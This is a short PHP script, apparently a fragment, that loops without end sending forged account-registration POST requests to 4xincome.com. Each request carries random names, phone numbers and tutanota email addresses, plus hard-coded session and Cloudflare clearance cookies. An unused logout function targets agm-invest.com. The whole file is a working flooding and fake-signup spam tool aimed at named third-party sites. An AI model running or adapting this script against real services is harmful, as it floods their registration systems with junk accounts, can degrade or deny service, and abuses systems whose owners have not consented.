
$data = str_repeat("A", 10000);

$host = "4xincome.com";

$myIp = "104.25.181.108";
$path = "/registration.php";
$cookie = "__cfduid=d4f9a7ad1fbbda06f3775688e9ca479181544621882; PHPSESSID=gr9mbin6kqiofui6dt3oenbel4; TawkConnectionTime=0; __tawkuuid=e::accounts.4xincome.com::jDDWAhG0hEeUN3RPXRvDGbdQFUiZiASR331OUtbgkTcMvcATVYIZD/x5Yg5OrRTU::2; cf_clearance=20c6ac3db307187db5b7a90a46269bbd38758654-1544633476-1800-150";
while(1)
        {
				$post_data = 'country=DE&state=' .genrandstring(). '&first_name=' .genrandstring(). '&last_name=' .genrandstring(). '&phone=63521' .rand(100000,999999). '&email=asuhdih' .rand(100000,999999). '%40tutanota.com&password=q1w2e3&con_password=q1w2e3&type_of_account=1&referer_code=&ib_code=&reg_type=0';
                $socket = fsockopen("ssl://".$host, 443, $errno, $errstr, 15);
                $http = "POST {$path} HTTP/1.1\r\n";
                $http .= "Host: 4xincome.com\r\n";
                $http .= "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0\r\n";
                $http .= "Accept: */*\r\n";
                $http .= "Accept-Language: en-US,en;q=0.5\r\n";
                $http .= "Referer: https://agm-invest.com/registration.php\r\n";
                $http .= "Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n";
                $http .= "X-Requested-With: XMLHttpRequest\r\n";
                $http .= "Content-Length: " .strlen($post_data). "\r\n";
                $http .= "Connection: close\r\n";
                $http .= "Cookie: ".$cookie."\r\n\r\n";
                $http .= $post_data . "\r\n";

                fwrite($socket, $http);

                $contents = "";
                while (!feof($socket)) {
                        $contents.= fgets($socket, 4096);
                }

                fclose($socket);
                echo(".");
                //echo $contents;
				//logout();

        }
function logout()
{
				global $cookie;
				$host = "agm-invest.com";
	            $socket = fsockopen("ssl://".$host, 443, $errno, $errstr, 15);
                $http = "GET /logout.php HTTP/1.1\r\n";
                $http .= "Host: agm-invest.com\r\n";
                $http .= "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0\r\n";
                $http .= "Accept: */*\r\n";
                $http .= "Accept-Language: en-US,en;q=0.5\r\n";
                $http .= "Referer: https://agm-invest.com/registration.php\r\n";
                $http .= "X-Requested-With: XMLHttpRequest\r\n";
                $http .= "Connection: close\r\n";
                $http .= "Cookie: " .$cookie. "\r\n\r\n";

                fwrite($socket, $http);

                $contents = "";
                while (!feof($socket)) {
                        $contents.= fgets($socket, 4096);
                }

                fclose($socket);
}

function genrandstring()
{
    $characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
    $result = '';
    for ($i = 0; $i <100; $i++)
        $result .= $characters[mt_rand(0, 61)];
    return $result;
}
